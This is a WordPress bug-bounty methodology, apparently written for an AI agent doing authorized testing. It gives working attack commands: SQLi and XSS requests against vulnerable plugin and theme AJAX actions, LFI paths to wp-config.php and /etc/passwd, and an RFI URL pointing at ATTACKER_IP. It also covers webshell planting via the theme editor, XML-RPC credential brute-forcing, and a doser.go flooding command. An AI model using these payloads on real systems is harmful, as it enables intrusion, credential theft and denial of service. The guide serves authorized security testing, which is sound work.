---
technology: WordPress
kind: bug-bounty-methodology
audience: ai-agent
version: 1.1
family: web-platforms
evidence: "14 files (see ../internal coverage ledger)"
source: "rewritten from KathanP19/HowToHunt (CMS/wordpress.md), GPL-3.0, accessed 2026-11-13"
provenance: "mined from 14 evidence files + upstream-verified: WPScan User Documentation (wpscanteam/wpscan GitHub wiki: enumeration options, modes, api-token), Kali wpscan tool page (CLI flags), NVD + Rapid7 CVE-2022-0739 (bookingpress), Bitnami + stackharbor XML-RPC references — note: XML-RPC surface is upstream-sourced; the evidence base has zero WordPress xmlrpc usage (the only 'xmlrpc' hit is Apache OFBiz). Accessed 2026-11-12. HTH INGEST 2026-11-13: Phase 7 DoS surfaces + CVE-2021-24364 example + doser.go rewritten from KathanP19/HowToHunt (CMS/wordpress.md), GPL-3.0, accessed 2026-11-13; CVE-2018-6389 and CVE-2021-24364 verified against NVD records, doser.go against its repo."
---

Companion page: [[wordpress|WordPress overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# WordPress Bug Bounty Methodology

**Scope:** WordPress core + plugins/themes on any install path (root, `/wp/`, `/blog/`), its auth surface (`wp-login.php`, `xmlrpc.php`), REST API (`/wp-json/`), and the file conventions (`wp-config.php`, `wp-content/`). **Out of scope:** generic PHP misconfigurations with no WordPress dependency (php-fpm unit), the database behind it (mysql/postgres units).

**Authorization:** presumes written permission. Brute-force phases (`--passwords`, XML-RPC multicall) are **DESTRUCTIVE-adjacent** (account lockouts, WAF bans): agree rates first, prefer two password-per-user confirmation runs over rockyou-complete, and never spray admin accounts on production without sign-off.

## Decision tree (one screen)

1. WordPress confirmed (wp-content paths, generator meta, robots `/wp-admin`) → Phase 2 (enumerate).
2. wpscan version output + api token → Phase 3 (match CVEs) — no token: manual version-gap → searchsploit/advisory hunt.
3. Plugin found with LFI/RFI/upload surface → Phase 4 (exploit classes, observed payloads).
4. Valid users + cred path → Phase 5 (wp-login / xmlrpc brute) → wp-admin → theme/plugin editor RCE.
5. Any file read → Phase 6 (`wp-config.php` read paths) → DB pivot.

## Phase 1 — Fingerprinting

```bash
curl -s http://example.com/ | grep -iE "wp-content|wp-includes|generator"
curl -s http://example.com/robots.txt              # Disallow: /wp-admin  → WordPress tell
curl -s http://example.com/wp-json/wp/v2/users | jq   # user enumeration on default permalinks
```

Observed tells: footer "Proudly powered by WordPress"; robots.txt `Disallow: /wp-admin`; stylesheet links containing `/wp-content/plugins/<name>/…?ver=<version>` (`bookingpress…css?ver=1.0.10`; `give.css?ver=3.14.0`).

## Phase 2 — Enumeration (wpscan workflows)

Upstream-verified option set (WPScan wiki + Kali page): `-e/--enumerate` accepts `vp` vulnerable plugins, `ap` all plugins, `p` popular, `vt`/`at`/`t` themes, `tt` timthumbs, `cb` config backups, `dbe` db exports, `u` users, `m` media; **default when `-e` is bare: `vp,vt,tt,cb,dbe,u,m`**. Detection modes `--plugins-detection passive|mixed|aggressive` (default mixed). `--api-token TOKEN` pulls WPScan Vulnerability Database data at scan time — without it, no CVE display (free tokens at wpscan.com).

Observed invocation patterns:

```bash
wpscan --url http://example.com/                                  # default enumeration (observed: Give 3.14.0 found)
wpscan --url http://example.com/blog/ --enumerate p               # plugins only (observed)
wpscan --url https://example.com/ --clear-cache --enumerate at,ap --disable-tls-checks --random-user-agent   # all themes+plugins (observed)
wpscan --url http://example.com/ --plugins-detection aggressive   # found buddyforms 2.7.7 where passive saw nothing (observed)
wpscan --url http://example.com/ -e u --passwords creds.txt       # users then brute (upstream cheat-sheet shape)
```

Manual equivalents when wpscan is blocked/noisy: `/wp-content/plugins/<guess>/readme.txt` (Stable Tag), directory listing (observed: listable `/testing/`), `?ver=` strings, error pages. Read wpscan's per-finding confidence and "Found By" lines (observed: "Version 2.7.7 (80% confidence) — Found By: Readme - Stable Tag (Aggressive Detection)").

## Phase 3 — Version-gap → CVE matching (and the spoof trap)

Workflow: installed version + latest version (wpscan prints both) → gap → advisory hunt keyed on **exact** version. Observed: asgaros-forum 1.15.12 vs latest 2.0.0 → online advisory → exploit; and wpscan reported a Gwolle Guestbook version whose listed XSS "doesn't seem that useful"; searchsploit showed an RFI for a different version; **the admin had edited the plugin's readme.txt to feed wpscan a fake version; the real one (1.5.3) was confirmed from the plugin source/readme inspection and the RFI was real.**

Rules:
1. Never trust one version source: cross-check `readme.txt` Stable Tag, plugin PHP file headers, `?ver=` strings, and exploit-fit (does the PoC's code path exist in the installed files?).
2. Version-gate every claim in your report: "plugin X < Y.Z is vulnerable to CVE-N" requires the installed version to be *inside* the affected range, verified from source, not from the readme alone.
3. wpscan's vuln DB is token-metered; searchsploit (Exploit-DB) and the plugin's own changelog are the free cross-checks (one observed engagement did exactly this loop).

## Phase 4 — Plugin/theme exploit classes (observed payloads)

**Unauthenticated SQLi via admin-ajax.php** — bookingpress < 1.0.11, CVE-2022-0739 (verified NVD/Rapid7: `bookingpress_front_get_category_services` AJAX action accepts unsanitized POST into dynamic SQL, no auth):

```bash
curl -i 'http://example.com/wp-admin/admin-ajax.php' --data \
  'action=bookingpress_front_get_category_services&_wpnonce=<nonce>&category_id=<sqli>'
```

The `_wpnonce` comes from the booking page HTML — CSRF nonces are not auth (observed).

**Unauthenticated reflected XSS via admin-ajax.php — the theme-side twin** (upstream, verified NVD/WPScan): Jannah theme < 5.4.4, CVE-2021-24364 (CVSS 3.1 6.1, PR:N/UI:R) — the `tie_get_user_weather` AJAX action echoes an unsanitized `options` JSON parameter back into the page, so a script tag riding inside any string field of that JSON executes on reflection:

```bash
curl -s 'http://example.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=<url-encoded JSON carrying the payload in a string field>'
```

Same class as bookingpress: the AJAX action runs without a login gate. The lesson for enumeration — themes expose `admin-ajax.php?action=` handlers exactly like plugins do, so theme-name discovery feeds the same action-name guessing.

**LFI/SSRF via plugin include parameters:**

```text
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php   (observed)
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd    (observed; same param takes http(s):// → SSRF)
```

**RFI via abspath-style includes** — plugin PHP doing `require_once($_REQUEST['abspath'].'wp-load.php')` or `ajaxresponse.php?abspath=http://ATTACKER_IP/` (gwolle-gb observed; brandfolder `wp_abspath=/dev/shm/` observed).

**Direct RCE in plugin/theme PHP** — `wp-maintenance.php?cmd=id` (observed), theme file write + include: uploads landing under `/wp-content/uploads/YYYY/MM/`, then a path-traversal-ish reference to execute it (an observed chain uploaded through buddyforms and referenced the file with a relative path one level up).

## Phase 5 — Auth surface

- **wp-login.php** — exists by default (observed: "/wp-login sub-directory" + credentials → admin). Enumerate users first (`-e u`, `/wp-json/wp/v2/users`, `?author=1` redirects), then targeted guesses. Successful admin login → theme/plugin editor (edit a `.php` under wp-content with a webshell — the classic post-auth RCE), or plugin upload (`zip` of a plugin containing PHP).
- **xmlrpc.php** [upstream, not observed] — enabled by default since WP 3.5; `system.multicall` batches up to hundreds of `wp.getUsersBlogs` credential checks per HTTP POST (brute-force amplification without wp-login rate limits); `pingback.ping` turns the site into a DDoS/SSRF-ish probe relay (X-Pingback header). Test: `POST /xmlrpc.php` with `<methodName>system.listMethods</methodName>`; report multicall credential-testing reachability even without cracking anything.

## Phase 6 — wp-config.php read paths (credential loot)

Every path actually used in the evidence base:

| Path | Seen |
|---|---|
| Plugin LFI (`filedownload.php?ebookdownloadurl=../../../wp-config.php`) | observed |
| Backup exposure (`/backup/…/html/wp-config.php` in a listable/copied backup tree) | observed |
| Editor droplet (`wp-config.php.save` left by nano on-disk edit) | observed |
| Post-shell `cat /var/www/html/wordpress/wp-config.php` | observed |
| wpscan `cb` enumeration (config backup hunting: `wp-config.php.bak`, `wp-config.php~`) | upstream class |

Yield: `DB_NAME/DB_USER/DB_PASSWORD/DB_HOST` (+ salts). Pivot: connect to the database (mysql/postgres units), crack reused credentials elsewhere, and read `AUTH_KEY`-class constants for session forgery where relevant.

## Phase 7 — Denial-of-service surfaces (scope-check first)

Availability attacks are out of scope in many programs — confirm DoS is accepted before touching any of this, and prove with the smallest request count that demonstrates the differential.

- **Script-concatenation amplification (CVE-2018-6389).** `wp-includes/script-loader.php` registers a large inventory of JS files, and the `wp-admin/load-scripts.php` / `load-styles.php` pair concatenates whatever script list the client sends — one cheap unauthenticated GET forces the server to assemble the entire registered file list, and a loop of them multiplies server work per request (NVD: CVSS 3.0 7.5, AV:N/AC:L/PR:N, scoped "through 4.9.2"; the endpoints are long-lived core files, so gate any report on a demonstrated response differential rather than on core version alone).
- **wp-cron.php re-spawn hammering.** `/wp-cron.php` answers a blank 200 on stock installs; in the default configuration every hit can trigger scheduling and task spawning, so flooding it multiplies the work each request costs the server.
- **doser.go** (github.com/Quitten/doser.go — the Go successor of the `doser.py` that older notes still cite) drives both surfaces: `./doser -t 999 -g 'http://example.com/wp-cron.php'` — `-g`/`-p` select GET/POST, `-t` threads, `-d` POST data. Destructive by design; authorization first.

## Disclosure notes

- Version-gate every CVE claim and name both sources ("readme says 1.5.3, plugin header confirms") — the readme-version spoof is a live risk of false negatives/positives.
- Unauthenticated plugin SQLi/LFI outranks login brute-force in impact; report the brute surface separately as hardening (rate limiting, xmlrpc restrictions).
- `wp-config.php` disclosure = full DB compromise chain; classify as critical only with proof the DB host is reachable or the creds work.

## Appendix A — Tool mapping (prose)

- **wpscan** — enumeration (`-e vp/ap/p/vt/at/t/tt/cb/dbe/u/m`), `--plugins-detection`, `--api-token`, `--clear-cache`, `--disable-tls-checks`, `--random-user-agent`, `--passwords` brute.
- **searchsploit** — Exploit-DB cross-check for plugin exploits (catches what the version-DB misses, and what a spoofed readme hides).
- **curl** — manual readme.txt/REST/LFI/xmlrpc interaction; the whole Phase 1 and Phase 4 surface is curl-able.
- **sqlmap** — drives admin-ajax.php SQLi after the nonce is lifted from the page.
- **hashcat / John** — cracking hashes looted from the WordPress DB (`$P$`/`$2y$` phpass/bcrypt forms).
- **wp-cli** — post-shell WordPress operations inside the target (user enumeration, option dumps) when PATH has it.
- **Burp Suite** — nonce capture and request tampering on the booking-press-class endpoints.
- **doser.go** — threaded GET/POST flooder for the Phase 7 DoS differentials (`-t` threads, `-g`/`-p` method, `-d` data).
